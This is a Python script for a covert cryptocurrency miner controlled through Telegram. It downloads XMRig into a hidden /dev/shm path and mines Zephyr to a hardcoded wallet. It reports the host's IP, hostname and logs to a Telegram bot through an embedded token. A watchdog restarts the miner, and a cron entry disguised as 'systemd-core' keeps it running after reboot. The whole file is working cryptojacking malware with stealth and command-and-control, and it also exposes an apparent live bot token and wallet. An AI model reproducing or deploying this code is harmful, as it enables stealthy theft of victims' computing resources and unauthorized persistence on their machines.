#!/usr/bin/env python3
import os, subprocess, time, socket, requests, threading, telebot, platform
from datetime import datetime
from uuid import uuid4

# 🔒 CONFIGURATION (edit your values here)
BOT_TOKEN = "7987532893:AAGvwCj4X83Qr5IFYyk3GeO3synDYR5Xh4Y"
CHAT_ID = "7285391034"
POOL = "fr.zephyr.herominers.com:1123"
WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b"
COIN = "zeph"
THREADS = "4"

# 🏷️ Runtime variables
WORKER_NAME = f"worker-{uuid4().hex[:5]}"
XM_PATH = "/dev/shm/.xmr"
LOG_FILE = "/dev/shm/.log"

# 📡 Setup Telegram bot
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

def get_ip():
    try:
        return requests.get("https://api.ipify.org").text.strip()
    except: return "?"

def uptime():
    try:
        return subprocess.getoutput("uptime -p").strip()
    except: return "?"

def get_hashrate():
    try:
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()
            for line in reversed(lines):
                if "speed" in line and "H/s" in line:
                    return line.strip().split("speed ")[1].split(" ")[0]
    except: pass
    return "?"

def is_miner_running():
    try:
        out = subprocess.getoutput(f"ps aux | grep {XM_PATH} | grep -v grep")
        return bool(out.strip())
    except: return False

def start_miner():
    if not os.path.exists(XM_PATH):
        subprocess.run(f"curl -L -o {XM_PATH} https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz", shell=True)
        subprocess.run(f"tar -xf {XM_PATH} -C /dev/shm/", shell=True)
    cmd = f"{XM_PATH}/xmrig -o {POOL} -u {WALLET}.{WORKER_NAME} -p x --coin {COIN} --tls -t {THREADS} >> {LOG_FILE} 2>&1"
    subprocess.Popen(cmd, shell=True, executable="/bin/bash")

def stop_miner():
    subprocess.run(f"pkill -f {XM_PATH}", shell=True)

def send_telegram(msg):
    try:
        bot.send_message(CHAT_ID, f"<b>{msg}</b>")
    except Exception as e:
        pass

def send_log():
    try:
        with open(LOG_FILE, "r") as f:
            bot.send_document(CHAT_ID, f)
    except: send_telegram("Log file missing.")

# 👁 Watchdog Thread
def watchdog():
    while True:
        if not is_miner_running():
            send_telegram("⚠️ Miner stopped! Restarting...")
            start_miner()
        time.sleep(10)

# 🧠 Command handlers
@bot.message_handler(commands=["start"])
def handle_start(msg):
    send_telegram("⛏ Miner starting manually...")
    start_miner()

@bot.message_handler(commands=["stop"])
def handle_stop(msg):
    stop_miner()
    send_telegram("🛑 Miner stopped.")

@bot.message_handler(commands=["status"])
def handle_status(msg):
    info = f"""
💠 <b>Status</b>
Miner: {"✅" if is_miner_running() else "❌"}
IP: {get_ip()}
Uptime: {uptime()}
Worker: {WORKER_NAME}
Threads: {THREADS}
Pool: {POOL}
"""
    send_telegram(info)

@bot.message_handler(commands=["speed"])
def handle_speed(msg):
    h = get_hashrate()
    send_telegram(f"⚙️ Hashrate: <code>{h}</code> H/s" if h != "?" else "❓ No hashrate found.")

@bot.message_handler(commands=["log"])
def handle_log(msg):
    send_log()

@bot.message_handler(commands=["setname"])
def handle_setname(msg):
    global WORKER_NAME
    args = msg.text.split()
    if len(args) == 2:
        WORKER_NAME = args[1]
        send_telegram(f"🔧 Worker name set to <b>{WORKER_NAME}</b>.")
    else:
        send_telegram("❗ Use /setname <name>")

@bot.message_handler(commands=["help"])
def help_cmd(msg):
    send_telegram("""
🛠 Commands:
/start — Start miner
/stop — Stop miner
/status — Miner info
/speed — Current hashrate
/log — Send log file
/setname <name> — Set worker name
""")

# 🧿 Persistence Setup (Linux only)
def setup_persistence():
    if "linux" in platform.system().lower():
        cron_job = f"@reboot python3 {os.path.abspath(__file__)}"
        cron_path = "/etc/cron.d/systemd-core"
        if not os.path.exists(cron_path):
            with open(cron_path, "w") as f:
                f.write(f"@reboot root {cron_job}\n")
            subprocess.run("chmod 755 /etc/cron.d/systemd-core", shell=True)

# 🔧 Initial setup
def bootstrap():
    send_telegram(f"✅ Miner started on {platform.node()} ({get_ip()})")
    setup_persistence()
    threading.Thread(target=watchdog, daemon=True).start()
    bot.polling(none_stop=True)

if __name__ == "__main__":
    bootstrap()
